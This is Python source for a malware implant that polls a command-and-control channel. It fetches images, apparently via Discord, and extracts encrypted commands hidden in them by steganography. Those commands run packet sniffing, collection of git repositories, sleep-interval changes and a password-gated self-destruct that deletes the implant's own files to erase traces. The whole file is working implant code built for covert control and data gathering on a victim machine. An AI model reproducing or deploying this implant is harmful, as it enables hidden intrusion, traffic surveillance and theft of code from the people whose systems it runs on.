from tracemalloc import start
import click
from matplotlib import image
from stegano import lsbset
from stegano import lsb
from stegano.lsbset import generators
from cryptography.fernet import Fernet
from os.path import exists
import os
import helper
from os import remove
from sys import argv

import time
import json
import sys
import hashlib

def app_path():
    if getattr(sys, 'frozen', False):
        app_path = os.path.dirname(sys.executable)
    elif __file__:
        app_path = os.path.dirname(__file__)
    return app_path

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

f = open(resource_path('secrets.json'))
secrets = json.load(f)

SLEEP_TIME = 5

def extract_message(image):
    return lsb.reveal(image)

def decrypt_message(message, key):
    f = Fernet(key)
    return f.decrypt(message.encode()).decode()

def unwrap_command(embedded_command, key):
    command_ciphertext = extract_message(embedded_command)
    command = decrypt_message(command_ciphertext, key)
    return command

def fetch_command():
    filepath = resource_path('c2_discord.py')
    os.system(f'python3 {filepath}')
    if exists(secrets["IMAGE_DOWNLOAD_PATH"]):
        command = unwrap_command(secrets["IMAGE_DOWNLOAD_PATH"], secrets["ENCRYPTION_KEY"])
        os.remove(secrets["IMAGE_DOWNLOAD_PATH"])
    else:
        command = None
    return command

def destruct():
    try:
        os.remove('c2_discord.py')
        os.remove('c2_implant.py')
        os.remove('helper.py')
        os.remove('secrets.json')
        os.remove('finalkey.json')
        os.rmdir('start.sh')
        remove(argv[0])
        os.rmdir('raw_img')
        os.rmdir('secret_img')
    except:
        pass
    sys.exit()


def parse_command(command):
    tokens = command.split(" ")
    if len(tokens) < 1:
        return
    if tokens[0] in secrets["FUNC_TABLE"].keys():
        keyphrase = secrets["FUNC_TABLE"][tokens[0]]
    else:
        print("invalid command")
        return
    
    if keyphrase == "sniff":
        if len(tokens) < 2:
            print('missing arguments')
            return
        helper.sniff(int(tokens[1]))
    elif keyphrase == "repos":
        helper.get_git_repos()
    elif keyphrase == "sd":
        if len(tokens) < 2:
            print('missing arguments')
            return
        stored_key = secrets['DESTROY_CREDS']['key'].encode("iso-8859-1")
        new_key = hashlib.pbkdf2_hmac('sha256', tokens[1].encode('utf-8'), secrets['DESTROY_CREDS']['salt'].encode('iso-8859-1'), 100000, 128)
        if new_key == stored_key:
            destruct()
        else:
            print("Wrong!")
    elif keyphrase == "setsleep":
        if len(tokens) < 2:
            print('missing arguments')
            return
        global SLEEP_TIME
        SLEEP_TIME = int(tokens[1])
        print(f'Set SleepTime to {SLEEP_TIME}')

while True:
    time.sleep(SLEEP_TIME)

    print('Fetching image ...')

    command = fetch_command()

    if command is not None:
        print(f'Command recieved! {command}')
        parse_command(command)
    else:
        print('Nothing found')

